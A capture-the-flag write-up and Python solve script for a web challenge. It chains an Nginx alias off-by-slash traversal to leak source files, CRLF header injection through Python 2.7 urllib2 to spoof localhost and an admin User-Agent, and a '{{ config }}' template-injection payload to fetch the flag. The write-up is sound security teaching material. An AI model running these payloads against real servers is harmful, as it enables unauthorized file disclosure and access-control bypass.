open source code can be found through /static../run.sh etc
http://chall.c00k3d.xyz:9999/static../src/app/routes.py
Exploit & Writeup
Vulnerabilities

    Nginx Alias Off-by-Slash File Disclosure

    CRLF Injection in HTTP Headers

    Server-Side Template Injection (SSTI)

Exploitation Steps

    Leaking Source Code via Nginx Alias Misconfiguration

        The Nginx configuration has an alias directive issue that allows directory traversal.

        Requesting http://{{HOST}}/static../ exposes the parent directory of /static, revealing sensitive files.

        Using this, we can retrieve key files like Dockerfile and run.sh for further analysis.

    Bypassing IP Restrictions with CRLF Injection

        Python urllib2.urlopen in Python 2.7.16 is vulnerable to CRLF injection in the URL parameter.

        This allows an attacker to manipulate raw HTTP headers.

        By injecting an X-Forwarded-For header, we can spoof our IP as 127.0.0.1, bypassing localhost-only restrictions.

    User-Agent Manipulation for Full Exploitation

        The application validates requests based on the User-Agent header, which defaults to python/urllib-2.7.16.

        To bypass this check, we inject a custom User-Agent header using CRLF injection.

        An additional CRLF is needed to shift default headers into the HTTP body, ensuring the injection is correctly parsed.

🔹 Solution Script: solve.py:
└─$ cat solve.py  
#!/usr/bin/python3
import re
import requests

HOST = "http://chall.c00k3d.xyz:9999"   # external access

# source download under /home/ directory
def download(path):
    url = HOST + "/static../" + path
    resp = requests.get(url)
    print(f"[+] Downloaded {path} ({len(resp.text)} bytes)")
    return resp.text

# proxy request with header injections
def req_with_header(url, headers=dict()):
    # Build the injected HTTP request string
    new_url = "%s HTTP/1.1\r\n" % url
    for k, v in headers.items():
        new_url += "%s: %s\r\n" % (k, v)
    # trailing header to ensure request is forwarded
    new_url += "AAAA: "

    print("[*] Sending crafted request:\n", new_url)
    resp = requests.post(HOST + "/renderer/", data={"url": new_url})
    return resp.text

# ---- Exploit Flow ----

# Leak source files (for debugging / confirmation)
download("src/uwsgi.ini")
download("src/run.py")
download("src/app/__init__.py")
download("src/app/routes.py")

# Step 1: Write admin's log with template string injection
first = req_with_header(
    "http://127.0.0.1:80/renderer/admin",  # internal service runs on 80
    headers={"X-Forwarded-For": "{{ config }}"}
)

# Step 2: Trigger request without injection to retrieve response
test = req_with_header("http://127.0.0.1:80/renderer/admin")
print("[+] Admin response preview:\n", test)

# Extract ticket number from the first request’s response
tno = first.split("ticket no ")[1].split()[0].strip()
print(f"[+] Got ticket number: {tno}")

# Step 3: Use admin-like headers to fetch the ticket
second = req_with_header(
    f"http://127.0.0.1:80/renderer/admin/ticket?ticket={tno}",
    headers={
        "X-Forwarded-For": "127.0.0.1",
        "User-Agent": "AdminBrowser/1.337",
        "Content-Type": "text/plain",
        "Host": HOST[7:] + "\r\n"  # still points to external host:port
    }
)

print("[+] Final response:\n", second)

# Step 4: Try to auto-extract dynamic flag (C00K3D{...})
flag = re.search(r"C00K3D\{.*?\}", second)
if flag:
    print(f"[+] FLAG FOUND: {flag.group(0)}")
else:
    print("[!] No flag found in response")

